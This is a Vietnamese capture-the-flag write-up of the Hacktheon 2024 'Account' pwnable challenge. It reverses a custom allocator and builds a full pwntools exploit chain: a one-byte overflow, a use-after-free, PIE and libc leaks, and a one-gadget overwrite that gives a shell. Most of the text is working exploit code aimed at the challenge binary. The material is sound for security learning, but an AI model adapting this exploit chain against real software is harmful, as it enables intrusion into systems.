---
title: "Hacktheon 2024: Account"
description: "Hacktheon 2024: Account"
summary: "Hacktheon 2024: Account writeup"
categories: ["Writeup"]
tags: ["Pwnable"]
#externalUrl: ""
date: 2024-05-02
draft: false
authors:
  - Shin24
---

Vừa rồi mình cùng team `Weebpwn` đã tham gia giải Hacktheon 2024 ở bảng Advanced và kết thúc với thứ hạng **#7**

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/33388f3d-99d0-4b5f-846b-7ffbb207dbea)

Đề web của giải khá dễ và gần như không có gì đáng nói, ở mảng pwn thì còn 1 bài khá tốn thời gian reverse là `Account`, sau giải thì mình quyết định ngồi giải lại bài này vì nghe bạn mình nói nó custom lại allocator riêng và cần reverse lại nghe khá hay.

## Reversing

File ELF with symbol mà mình đã reverse: [sym.zip](https://github.com/CP04042K/cp04042k.github.io/files/15187184/sym.zip)

Sau khi reverse mình nắm được một vài ý chính của chương trình như sau:
- Đây là một account manager có các chức năm create, rename, delete. Các account có thể được add vào các group và các group thì cũng có các method để create, delete, add user, print users, ...
- Một account sẽ được biểu diễn bởi một struct như sau
```C
struct account_struct
{
  char type;
  bool inUse;
  __int64 *name;
};
```
- Thuộc tính inUse sẽ được tăng lên sau mỗi lần add vào một group, đến khi out hết group thì mới có thể free
- `type` được dùng để xác định cách handle member `name` của account, nếu giá trị là 1 thì sẽ được xử lý bằng các hàm của libc (strcpy, strlen), nếu là 0 thì dùng các hàm custom để handle
- Allocator sẽ dùng 2 struct để quản lý memory

```C
struct memory_struct
{
  _QWORD *buf;
  _DWORD size;
  allocate_struct *chunks;
  allocate_struct *sus;
};
```

```C
struct allocate_struct
{
  _DWORD status;
  int size;
  _QWORD *ptr;
  allocate_struct *next_chunk;
};
```
- member `buf` của `memory_struct` là con trỏ trỏ đến một `mmap`-ed region, `size` sẽ keep track số bytes allocated so far
- `allocate_struct` đại diện cho một memory chunk, status để xác định xem nó đã freed hay in use (freed = 2, in use = 1), `size` là độ rộng của chunk để reuse, `ptr` là con trỏ trỏ đến buffer trong `mmap`-ed region, `next_chunk` trỏ đển chunk kế tiếp.
- Các memory chunk được quản lý theo single linked list, cơ chế reuse lặp qua list và nếu size của requested chunk và chunk bằng nhau thì sẽ reuse lại chunk này.
- Cơ chế free không kiểm tra status của chunk, không có cơ chế chống double free

## Pwning
### One-byte OOB
Như đã đề cập, có 2 cách để `name` của một account được handled, cùng đi vào route sử dụng các custom function ( cái gì custom thì dễ bug lắm). Khi tạo account với type == 0 thì một hàm custom dùng để copy data từ input sang buffer sẽ được gọi 

```C
_BYTE *__fastcall copy_str(_BYTE *dest, _BYTE *src)
{
  bool isNotNull; // [rsp+17h] [rbp-29h]
  _BYTE *i; // [rsp+20h] [rbp-20h]

  for ( i = dest; ; i += 2 )
  {
    isNotNull = 1;
    if ( !*src )
      isNotNull = src[1] != 0;
    if ( !isNotNull )
      break;
    *i = *src;
    i[1] = src[1];
    src += 2;
  }
  *i = 0;
  i[1] = 0;
  return dest;
}
```
Hàm này thực hiện copy 2 ký tự mỗi lần từ `src` đến `dest`, dừng lại khi cả 2 ký tự liền kề đều là null, sẽ có edge cases khi sau null là 1 ký tự khác, điều này khiến vòng for không bị terminate và tiếp tục copy sang buffer mới. Tại tính năng rename, ta sẽ có một hàm custom khác để lấy length của string tạm gọi là `get_length` 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/16a2dc52-fb67-4d5f-ad37-2e4e04774612)

```C
__int64 __fastcall get_length(char *buf_ptr)
{
  bool isNotNull; // [rsp+Fh] [rbp-21h]
  __int64 i; // [rsp+18h] [rbp-18h]

  for ( i = 0LL; ; ++i )
  {
    isNotNull = 1;
    if ( !*buf_ptr )
      isNotNull = buf_ptr[1] != 0;
    if ( !isNotNull )
      break;
    buf_ptr += 2;
  }
  return i;
}
```
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/368319f1-e848-44c3-b866-65bfd5826b31)

Cách lấy length tại dòng 23 chính là vấn đề, khi mà việc +1 được thực hiện trước khi nhân 2, dẫn đến việc length trả về sẽ nhiều hơn 1 so với length thực tế. Khi rename, ta có thể chỉ định cách mà new_name được handle, nghĩa là cách lấy name length của account hiện tại có thể khác với cách lấy length của input. Vậy thì nếu type hiện tại của account là 0 (get_length) và rename với type là 1 (strlen) thì sẽ dẫn đến việc 1 byte kế tiếp sau name buffer bị ghi đè.

```py
from pwn import *
from pwn import u32, u64, p32, p64

exe = ELF("./sym", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = exe.process()

def create_account(type, name):
    sleep(0.08)
    io.send(b"\x00" + type + name)

def delete_account(id):
    sleep(0.08)
    io.send(b"\x01" + id)

def rename_account(type, account_id, new_name):
    sleep(0.08)
    io.send(b"\x02" + account_id + type + new_name)

def create_group():
    sleep(0.08)
    io.send(b"\x10")

def add_account_to_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x12" + group_id + account_id)

def remove_account_from_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x13" + group_id + account_id)

def group_print_all_accounts(group_id):
    sleep(0.08)
    io.send(b"\x14" + group_id)

def delete_group(group_id):
    sleep(0.08)
    io.send(b"\x11" + group_id)

create_account(b"\x00", b"A"*10)
pause()
rename_account(b"\x01", b"\x00", b"B"*11)
io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/edf6932c-6ace-4c2d-b2ae-ea8331c84f5f)

Tuy nhiên sau khi ghi đè xong 1 byte thì type sẽ được đổi từ 0 về 1, dẫn đến việc ta chỉ có thể ghi đè 1 byte trong 1 lần và gần như vô dụng, vậy làm sao thể get through? Ta sẽ làm ngược lại, tạo một account với type 1 và rename với type 0, vì các buffer trong allocate sát liền kề nhau nếu sau nullbyte của account's name sẽ là struct của một account khác (hoặc group), lúc này nếu ta dùng type 0 thì `copy_str` sẽ được dùng để copy data từ new_name sang name's buffer, 2 byte sau buffer sẽ bị ghi đè thành nullbyte, dẫn đến việc member `type` của struct `account_struct` sẽ bị ghi đè bởi nullbyte này về type 0. 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6d4b6359-1e73-4ae2-8daf-b540cbb030d2)

Từ đó ta có thể liên tục dùng account 0 để flip bit `type` của account 1 và rename account 1 để tiếp tục ghi đè 1 byte. Vậy với bug này ta sẽ làm gì để exploit tiếp? Ta có thể ghi đè inuse của account để free nó với `remove_account_from_group` mà không set `accounts[i] = NULL` dẫn đến use-after-free

```py
from pwn import *
from pwn import u32, u64, p32, p64

exe = ELF("./sym", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = exe.process()

def create_account(type, name):
    sleep(0.08)
    io.send(b"\x00" + type + name)

def delete_account(id):
    sleep(0.08)
    io.send(b"\x01" + id)

def rename_account(type, account_id, new_name):
    sleep(0.08)
    io.send(b"\x02" + account_id + type + new_name)

def create_group():
    sleep(0.08)
    io.send(b"\x10")

def add_account_to_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x12" + group_id + account_id)

def remove_account_from_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x13" + group_id + account_id)

def group_print_all_accounts(group_id):
    sleep(0.08)
    io.send(b"\x14" + group_id)

def delete_group(group_id):
    sleep(0.08)
    io.send(b"\x11" + group_id)

def use_after_free():

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*11)

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12)

    add_account_to_group(b"\x00", b"\x02")

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12 + b"\x01")

    remove_account_from_group(b"\x00", b"\x02")

create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*23)

create_group()

use_after_free()

create_group()
create_group()

io.interactive()
```

Lúc này account 2 và group 1 sẽ cùng trỏ vào một chunk, buffer `name` của account 2 lúc này sẽ là group 2. Exploit plan sẽ là leak mem thông qua group 1. Hiện tại nếu ta add account 2 vào group 1 và print all accounts của group 1 ra thì ta sẽ leak được địa chỉ của group 1, lý do là vì struct của account và group thì có vị trí của buffer trùng nhau, do đó thì khi `group_print_all_accounts` in `account->name` thực chất là đang in `group->accounts`, mà `group->accounts` lại chứa các địa chỉ của accounts do đó ta sẽ leak được mem của `mmap`-ed region. 

```py
from pwn import *
from pwn import u32, u64, p32, p64

exe = ELF("./sym", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = exe.process()

def create_account(type, name):
    sleep(0.08)
    io.send(b"\x00" + type + name)

def delete_account(id):
    sleep(0.08)
    io.send(b"\x01" + id)

def rename_account(type, account_id, new_name):
    sleep(0.08)
    io.send(b"\x02" + account_id + type + new_name)

def create_group():
    sleep(0.08)
    io.send(b"\x10")

def add_account_to_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x12" + group_id + account_id)

def remove_account_from_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x13" + group_id + account_id)

def group_print_all_accounts(group_id):
    sleep(0.08)
    io.send(b"\x14" + group_id)

def delete_group(group_id):
    sleep(0.08)
    io.send(b"\x11" + group_id)

def use_after_free():

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*11)

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12)

    add_account_to_group(b"\x00", b"\x02")

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12 + b"\x01")

    remove_account_from_group(b"\x00", b"\x02")

create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*23)

create_group()

use_after_free()

create_group()
create_group()

add_account_to_group(b"\x01", b"\x02")
group_print_all_accounts(b"\x01")

d = io.recv(0x58)
d = d[-7:(0x58-1)]

d = util.packing.unpack(d, word_size=6*8)
print("leak: " + hex(d))

io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c70c5fe6-87c2-45f7-9075-5b34f1f81b90)

Tới đây ta sẽ tính toán được vị trí cần để leak PIE là `leak+40`, ta sẽ ghi đè vị trí này thành buffer của account 2 và add account 2 vào group 0 để khi print all accounts của group 0 thì buffer lúc này của account 0 sẽ chứa địa chỉ của PIE

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/b72de279-b55a-4c1a-ab19-8983c19821eb)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8c79d074-fbbb-41f2-be3e-8bd6a245e897)

Có PIE rồi thì ta tính được vị trí của GOT và dùng cách tương tự để leak libc, sau đó override buffer của account 2 thành địa chỉ của nơi chứa địa chỉ của các function rồi override thành onegadget (vì các function này chỉ nhận vào một byte nên không thể override thành system rồi truyền /bin/sh vào được), cuối cùng là trigger bằng một group call bất kì

```py
from pwn import *
from pwn import u32, u64, p32, p64

exe = ELF("./sym", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = exe.process()

def create_account(type, name):
    sleep(0.08)
    io.send(b"\x00" + type + name)

def delete_account(id):
    sleep(0.08)
    io.send(b"\x01" + id)

def rename_account(type, account_id, new_name):
    sleep(0.08)
    io.send(b"\x02" + account_id + type + new_name)

def create_group():
    sleep(0.08)
    io.send(b"\x10")

def add_account_to_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x12" + group_id + account_id)

def remove_account_from_group(group_id, account_id):
    sleep(0.08)
    io.send(b"\x13" + group_id + account_id)

def group_print_all_accounts(group_id):
    sleep(0.08)
    io.send(b"\x14" + group_id)

def delete_group(group_id):
    sleep(0.08)
    io.send(b"\x11" + group_id)

def use_after_free():

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*11)

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12)

    add_account_to_group(b"\x00", b"\x02")

    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*12 + b"\x01")

    remove_account_from_group(b"\x00", b"\x02")

create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*10)
create_account(b"\x01", b"a"*23)

create_group()

use_after_free()

create_group()
create_group()

add_account_to_group(b"\x01", b"\x02")
group_print_all_accounts(b"\x01")

d = io.recv(0x58)
d = d[-7:(0x58-1)]

d = util.packing.unpack(d, word_size=6*8)
to_leak = d+40
print("leak: " + hex(d))

add_account_to_group(b"\x00", b"\x02")

tmp = b""
rename_account(b"\x00", b"\x00", b"a"*10)
rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01")
for i in range(6):
    sleep(0.2)
    tmp += b"A"
    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01" + tmp)

i = 0
tmp_1 = b""
for i in range(6):
    sleep(0.1)
    tmp_1 += b"A"
    rename_account(b"\x00", b"\x00", b"a"*10)
    rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01" + tmp + tmp_1)

rename_account(b"\x00", b"\x00", b"a"*10)
rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01" + tmp + p64(to_leak))

group_print_all_accounts(b"\x00")
d = io.recv(0x1c0)
d = d[-7:(0x1c0-1)]
d = util.packing.unpack(d, word_size=6*8)
pie = d - 0x10
got_leak = pie - 144

print("leak pie: " + hex(pie))

rename_account(b"\x00", b"\x00", b"a"*10)
rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01" + tmp + p64(got_leak))
group_print_all_accounts(b"\x00")
d = io.recv(0x2c)
d = d[-7:(0x2c-1)]

d = util.packing.unpack(d, word_size=6*8)

libc.address = d - 0x19ecb0

print("libc_base: " + hex(libc.address))

rename_account(b"\x01", b"\x01", b"a"*11 + b"\x01\x01" + tmp + p64(pie+0x30))
rename_account(b"\x01", b"\x02", p64(libc.address + 0xebc81)) # one gadget

pause()
group_print_all_accounts(b"\x01")

io.interactive()
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/fb031030-8dda-4133-9282-6e633f849af8)

Nếu không muốn dùng onegadget ta có thể leak tiếp stack thông qua libc rồi override buffer của account 2 thành địa chỉ stack chứa ret address rồi ROP -> system('/bin/sh'). 
